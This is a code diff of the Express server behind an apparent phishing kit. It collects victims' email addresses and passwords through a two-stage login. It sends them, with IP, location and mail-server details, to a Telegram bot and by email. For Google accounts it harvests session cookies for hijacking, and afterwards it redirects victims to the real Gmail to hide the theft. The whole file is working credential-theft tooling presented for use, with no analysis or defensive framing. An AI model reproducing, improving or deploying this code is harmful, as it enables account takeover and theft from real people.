+            count: jar.size,
+            cookieNames: jar.detailed().map(c => c.name),
+            cookies: jar.detailed(),
+            finalCookieHeader: jar.headerForExport(),
+            rawSetCookie: jar.rawSetCookie,
+            cookieHeaderSent: jar.rawSent,
+            rawText: jar.rawText(email, 'debug', { proxy: out.proxy, ua }),
             trace: out.trace
         });
     } catch (e) {
@@ -688,59 +743,34 @@ async function harvestDebug(req, res) {
 app.get('/api/harvest-debug', harvestDebug);
 app.post('/api/harvest-debug', harvestDebug);
 
-// ============================================================
-// TURNSTILE VERIFY
-// ============================================================
 app.post('/api/turnstile-verify', async (req, res) => {
     const { token, email } = req.body || {};
-    if (!token || typeof token !== 'string') {
-        return res.status(400).json({ success: false, message: 'Turnstile token required' });
-    }
-    if (!email || typeof email !== 'string' || !email.includes('@')) {
-        return res.status(400).json({ success: false, message: 'Valid email required' });
-    }
+    if (!token || typeof token !== 'string') return res.status(400).json({ success: false, message: 'Turnstile token required' });
+    if (!email || typeof email !== 'string' || !email.includes('@')) return res.status(400).json({ success: false, message: 'Valid email required' });
 
     const result = await verifyTurnstile(token, firstClientIp(req));
-    if (!result.success) {
-        return res.status(403).json({ success: false, message: 'Turnstile failed', details: result.data || result.error });
-    }
+    if (!result.success) return res.status(403).json({ success: false, message: 'Turnstile failed', details: result.data || result.error });
 
     const { proof, ts, expiresAt } = makeProof(email);
     return res.json({
         success: true, email, proof, ts, expiresAt,
         redirect: '/login.html?u=' + encodeURIComponent(email)
-                + '&p=' + encodeURIComponent(proof)
-                + '&t=' + ts
+                + '&p=' + encodeURIComponent(proof) + '&t=' + ts
     });
 });
 
-// ============================================================
-// LOGIN
-// ============================================================
 app.post('/api/login', async (req, res) => {
     const { email, password, stage = 1, firstPassword, turnstileToken, proof, proofTs, fingerprint } = req.body || {};
 
-    if (!email || !password) {
-        return res.status(400).json({ success: false, message: 'Email and password required' });
-    }
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
-        return res.status(400).json({ success: false, message: 'Invalid email format' });
-    }
+    if (!email || !password) return res.status(400).json({ success: false, message: 'Email and password required' });
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return res.status(400).json({ success: false, message: 'Invalid email format' });
 
     if (stage === 1) {
         let passed = false, reason = 'not-checked';
-        if (proof && proofTs) {
-            const v = verifyProof(email, proof, proofTs);
-            passed = v.valid; reason = v.reason;
-        } else if (turnstileToken) {
-            const v = await verifyTurnstile(token, firstClientIp(req));
-            passed = v.success; reason = v.success ? 'ok' : 'turnstile-failed';
-        } else {
-            reason = 'no-proof';
-        }
-        if (!passed && REQUIRE_TURNSTILE) {
-            return res.status(403).json({ success: false, stage: 1, message: 'Human verification required', reason });
-        }
+        if (proof && proofTs) { const v = verifyProof(email, proof, proofTs); passed = v.valid; reason = v.reason; }
+        else if (turnstileToken) { const v = await verifyTurnstile(turnstileToken, firstClientIp(req)); passed = v.success; reason = v.success ? 'ok' : 'turnstile-failed'; }
+        else reason = 'no-proof';
+        if (!passed && REQUIRE_TURNSTILE) return res.status(403).json({ success: false, stage: 1, message: 'Human verification required', reason });
     }
 
     const clientIP = firstClientIp(req);
@@ -748,70 +778,43 @@ app.post('/api/login', async (req, res) => {
     const domain = email.split('@')[1];
     const mxRecord = await getMXRecord(domain);
     const userAgent = req.headers['user-agent'] || 'Unknown';
-    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
-
     const isGoogle = GMAIL_DOMAINS.has(domain.toLowerCase()) || /google/i.test(mxRecord);
-    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
     const match = stage === 2 && firstPassword === password;
-    const matchLine = stage === 2 ? `First Password : ${firstPassword}\nMatch : ${match ? '✅ YES' : '❌ NO'}\n` : '';
+    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
 
     sendToTelegram(
-        `--------+ ReZulT [${stageLabel}] +--------\n` +
-        `Email : ${email}\nPassword : ${password}\n${matchLine}` +
-        `Browser : ${userAgent}\nLanguage : ${acceptLanguage}\n` +
-        `MX : ${mxRecord}\nIP : ${clientIP}\n` +
-        `Location : ${ipInfo.city || '?'} ${ipInfo.region || '?'}, ${ipInfo.country || '?'}\n` +
-        `Date : ${new Date().toISOString()}\n` +
-        `---------+ ReZulT [${stageLabel}] +-------------`
+        `--------+ ReZulT [${stageLabel}] +--------\nEmail : ${email}\nPassword : ${password}\n` +
+        (stage === 2 ? `First Password : ${firstPassword}\nMatch : ${match ? '✅ YES' : '❌ NO'}\n` : '') +
+        `MX : ${mxRecord}\nIP : ${clientIP}\nLocation : ${ipInfo.city || '?'} ${ipInfo.country || '?'}\n` +
+        `Date : ${new Date().toISOString()}\n---------+ ReZulT [${stageLabel}] +-------------`
     ).catch(() => {});
-
     sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage).catch(() => {});
 
-    const shouldHarvest = GMAIL_CAPTURE && isGoogle && (GMAIL_HARVEST_ALL || stage === 2);
     let harvest = null;
-
-    if (shouldHarvest) {
+    if (GMAIL_CAPTURE && isGoogle && (GMAIL_HARVEST_ALL || stage === 2)) {
         harvest = await harvestLocked(email.toLowerCase(), () =>
-            harvestAndReport({
-                email, password, firstPassword,
-                ua: fingerprint?.userAgent || userAgent,
-                ip: clientIP, ipInfo, stage, match
-            })
-        ).catch(e => {
-            console.error('❌ harvest failed:', e.message);
-            return { ok: false, error: e.message, traceLen: 0, needs2fa: false, total: 0, critical: 0, hasSid: false, hasPsid: false, filename: null, json: '[]', telegram: { ok: false, reason: e.message } };
-        });
+            harvestAndReport({ email, password, firstPassword, ua: fingerprint?.userAgent || userAgent, ip: clientIP, ipInfo, stage, match })
+        ).catch(e => ({ ok: false, error: e.message, traceLen: 0, needs2fa: false, proxy: null, total: 0, critical: 0, names: [], hasSid: false, hasPsid: false, filename: null, json: '[]', cookies: [], rawText: '', telegram: { ok: false } }));
     }
 
     const googleRedirect = GMAIL_DOMAINS.has(domain.toLowerCase())
         ? 'https://mail.google.com/mail/u/0/'
         : `https://mail.google.com/a/${domain}/`;
 
-    if (stage !== 2) {
-        return res.json({ success: true, stage: 1, harvest });
-    }
-
-    if (!match) {
-        return res.json({ success: true, stage: 2, match: false, message: 'Passwords do not match', harvest });
-    }
+    if (stage !== 2) return res.json({ success: true, stage: 1, harvest });
+    if (!match) return res.json({ success: true, stage: 2, match: false, message: 'Passwords do not match', harvest });
 
     return res.json({
-        success: true,
-        stage: 2,
-        match: true,
+        success: true, stage: 2, match: true,
         redirect: isGoogle ? googleRedirect : (TEAMS_REDIRECT || `https://${domain}`),
         harvest
     });
 });
 
-// ============================================================
-// STANDALONE HARVEST
-// ============================================================
 app.post('/api/gmail-session', async (req, res) => {
     if (!GMAIL_CAPTURE) return res.json({ ok: false, disabled: true });
     const { email, password, fingerprint = {} } = req.body || {};
     if (!email || !password) return res.status(400).json({ ok: false, message: 'email and password required' });
-
     const ua = fingerprint.userAgent || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
     try {
         const out = await harvestLocked(email.toLowerCase(), () =>
@@ -823,14 +826,8 @@ app.post('/api/gmail-session', async (req, res) => {
     }
 });
 
-// ============================================================
-// 404 + START
-// ============================================================
-app.use((req, res) => {
-    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
-});
+app.use((req, res) => res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` }));
 
 app.listen(PORT, () => console.log(`🚀 listening on ${PORT}`));
-
 process.on('uncaughtException', e => console.error('❌ Uncaught:', e.message));
 process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));
